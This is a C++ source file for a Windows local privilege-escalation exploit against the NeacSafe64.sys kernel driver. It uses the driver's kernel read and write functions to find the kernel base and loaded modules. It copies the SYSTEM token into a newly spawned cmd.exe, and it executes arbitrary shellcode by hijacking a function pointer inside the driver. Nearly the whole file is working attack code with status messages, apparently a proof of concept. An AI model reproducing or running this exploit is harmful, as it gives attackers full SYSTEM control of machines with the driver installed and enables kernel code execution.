// NeacController.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>

#include<windows.h>
#include"controller.h"
#include"service.h"

DWORD parse_export_rva(const BYTE* moduleBase, const char* funcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDirEntry = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDirEntry.VirtualAddress == 0) return 0;

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + exportDirEntry.VirtualAddress);
    DWORD* nameRvas = (DWORD*)(moduleBase + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)(moduleBase + exportDir->AddressOfNameOrdinals);
    DWORD* funcRvas = (DWORD*)(moduleBase + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* name = (const char*)(moduleBase + nameRvas[i]);
        if (_stricmp(name, funcName) == 0) {
            WORD ordinal = ordinals[i];
            return funcRvas[ordinal];
        }
    }
    return 0;
}
DWORD get_export_rva(const char *funcName) {
    char system32Path[MAX_PATH];

    GetSystemDirectoryA(system32Path, MAX_PATH);

    std::string kernelPath = std::string(system32Path) + "\\ntoskrnl.exe";

    HANDLE hFile = CreateFileA(kernelPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    HANDLE hMapping = CreateFileMapping(
        hFile, 
        NULL, 
        SEC_IMAGE | PAGE_READONLY,
        0, 0, 
        NULL
    );;
    if (!hMapping) {
        CloseHandle(hFile);
        return NULL;
    }
    const BYTE* fileBase = (const BYTE*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!fileBase) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return NULL;
    }

    DWORD rva = parse_export_rva(fileBase, funcName);
    UnmapViewOfFile(fileBase);

    CloseHandle(hMapping);
    CloseHandle(hFile);
    return rva;
}

PVOID SSDT_Items[0x1000];
HANDLE hPort;
PVOID find_krnl_images(PVOID PsLoadedModuleList, const wchar_t* name) {
    PVOID Ptr;
    kernel_read_data(hPort, &Ptr, PsLoadedModuleList, 8);
    WCHAR ModuleName[260] = {0};
    while(Ptr != PsLoadedModuleList) {
        memset(ModuleName, 0, sizeof(ModuleName));
        PVOID DllBase;
        kernel_read_data(hPort, &DllBase, (PBYTE)Ptr + 0x30, 8);

        USHORT NameSize;
        kernel_read_data(hPort, &NameSize, (PBYTE)Ptr + 0x58, 2);
        
        PVOID NameAddr;
        kernel_read_data(hPort, &NameAddr, (PBYTE)Ptr + 0x60, 8);

        kernel_read_data(hPort, &ModuleName, NameAddr, NameSize);
        if(!lstrcmpW(ModuleName, name)) {
            return DllBase;
        }
        kernel_read_data(hPort, &Ptr, Ptr, 8);
    }
    return NULL;
}

BOOL execute_shellcode(PVOID NeacSafe64Base, BYTE *Shellcode, DWORD Size) {
    if(Size > 0x10000) {
        return FALSE;
    }
    PVOID MemPtrAddr = (PVOID)((PBYTE)NeacSafe64Base + 0x2165C0);
    PVOID NonPagedPool;
    // try to get the address of NonPagedPool buffer in NeacSafe64.sys.
    if(!kernel_read_data(hPort, &NonPagedPool, MemPtrAddr, 8)) {
        return FALSE;
    }
    // write shellcodes to the buffer
    if(!kernel_write_data(hPort, NonPagedPool, Shellcode, Size)) {
        return FALSE;
    }
    // change the function pointer(NtProtectVirtualMemory) to NonPagedPool buffer.
    PVOID FuncPtrAddr = (PVOID)((PBYTE)NeacSafe64Base + 0x219EA0);
    if(!kernel_write_data(hPort, FuncPtrAddr, &NonPagedPool, 8)) {
        return FALSE;
    }
    // call the function pointer and execute the shellcode.
    protect_memory(hPort, GetCurrentProcessId(), GetModuleHandle(NULL), 16, 0);
    return TRUE;
}

void privileges_escalation(PVOID KrnlBase) {
    DWORD va = get_export_rva("PsInitialSystemProcess");
    if(va == NULL) {
        return;
    }
    PVOID PsInitialSystemProcess = (PVOID)((PBYTE)KrnlBase + va);
    PVOID PsInitialSystemProcessEPROCESS;

    if(!kernel_read_data(hPort, &PsInitialSystemProcessEPROCESS, PsInitialSystemProcess, 8)) {
        printf("[!] fail to get PsInitialSystemProcess EPROCESS...\n");
        return;
    }
    printf("[+] PsInitialSystemProcess EPROCESS: %p\n", PsInitialSystemProcessEPROCESS);
    // These tokens will need updating if you are on a different version of Windows!
    // The offsets can be found here: https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm

    uintptr_t TokenOffset = 0x04B8; // Windows 10 21H2+ and Windows 11 only
    uintptr_t PIDOffset = 0x0440; // Windows 10 21H2+ and Windows 11 only
    uintptr_t ActiveProcessLinksOffset = 0x0448; // Windows 10 21H2+ and Windows 11 only

    PVOID SystemToken;
    if(!kernel_read_data(hPort, &SystemToken, (PBYTE)PsInitialSystemProcessEPROCESS + TokenOffset, 8)) {
        printf("[!] fail to get SystemToken.\n");
        return;
    }
    printf("[+] SystemToken: %p\n", SystemToken);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi;
    CreateProcessA(
        "C:\\Windows\\system32\\cmd.exe",
        nullptr,
        nullptr,
        nullptr,
        TRUE,
        CREATE_NEW_CONSOLE,
        nullptr,
        "C:\\Windows",
        &si,
        &pi
    );
    DWORD OurShellPID = pi.dwProcessId;


    LIST_ENTRY activeProcessLinkList;
    uint64_t NextProcessEPROCESSBlock = (uint64_t)PsInitialSystemProcessEPROCESS;
    if(!kernel_read_data(hPort, &activeProcessLinkList, (PBYTE)PsInitialSystemProcessEPROCESS + ActiveProcessLinksOffset, sizeof(LIST_ENTRY))) {
        printf("[!] fail to get ActiveProcessLinks\n");
        return;
    }
    // You can fetch every single process' EPROCESS block from this original Kernel list, we iterate through it till we find our shell's PID.
    while (true) {
        DWORD processPID;
        NextProcessEPROCESSBlock = (uint64_t) activeProcessLinkList.Flink - ActiveProcessLinksOffset;
        // Fetch PID and compare it

        if(!kernel_read_data(hPort, &processPID, (PBYTE)NextProcessEPROCESSBlock + PIDOffset, 4)) {
            printf("[!] fail to read memory\n");
            return;
        }
        if (processPID == OurShellPID) {

            PVOID OurShellsToken;
            if(!kernel_read_data(hPort, &OurShellsToken, (PBYTE)NextProcessEPROCESSBlock + TokenOffset, 8)) {
                printf("[!] fail to read Token..\n");
                return;
            }
            printf("[+] Token: %p\n", OurShellsToken);

            if(!kernel_write_data(hPort, (PBYTE)NextProcessEPROCESSBlock + TokenOffset, &SystemToken, 8)) {
                printf("[!] fail to write Token..\n");
                return;
            }
            printf("[+] Success...");
            break;
        }

        // go to next process' EPROCESS.
        kernel_read_data(hPort, &activeProcessLinkList, (PBYTE)NextProcessEPROCESSBlock + ActiveProcessLinksOffset, sizeof(LIST_ENTRY));
    }
   
}
int main()
{
    start_driver();
    hPort = connect_driver();
    if(hPort == INVALID_HANDLE_VALUE) {
        printf("[!] fail to connect to driver\n");
    }
    get_ssdt_items(hPort, SSDT_Items, sizeof(SSDT_Items));
    DWORD rva = get_export_rva("NtWaitForSingleObject");
    if(rva == 0) {
        printf("[!] fail to get the rva of NtWaitForSingleObject\n");
        return 0;
    }
    if(SSDT_Items[4] == 0) {
        printf("[!] fail to get the address of NtWaitForSingleObject\n");
        return 0;
    }
    PVOID KrnlBase = (PVOID)((PBYTE)SSDT_Items[4] - rva);
    // calcuating the kernel module base.
    printf("[+] kernel module base address: %p\n", KrnlBase);

    rva = get_export_rva("PsLoadedModuleList");
    if(rva == 0) {
        printf("[!] fail to get the rva of PsLoadedModuleList\n");
        return 0;
    }
    PVOID PsLoadedModuleList = (PVOID)((PBYTE)KrnlBase + rva);
    PVOID NeacSafe64Base = find_krnl_images(PsLoadedModuleList, L"NeacSafe64.sys");
    if(!NeacSafe64Base) {
        printf("[!] fail to get the module base address of NeacSafe64.sys\n");
        return 0;
    }
    printf("[+] NeacSafe64.sys module base address: %p\n", NeacSafe64Base);

    // test Escalation of Privileges	
    privileges_escalation(KrnlBase);

    // test Code Execution
    BYTE Shellcode[2] = {0xC3, 0xCC};   // execute shellcode: ret, nothing will happen.
    execute_shellcode(NeacSafe64Base, Shellcode, 2);

    /*
    BYTE Shellcode[2] = {0xCC, 0xCC};   // execute shellcode: int 3, this will cause BSOD.
    execute_shellcode(NeacSafe64Base, Shellcode, 2);
    */
    getchar();
    CloseHandle(hPort);
    stop_driver();
    return 0;

}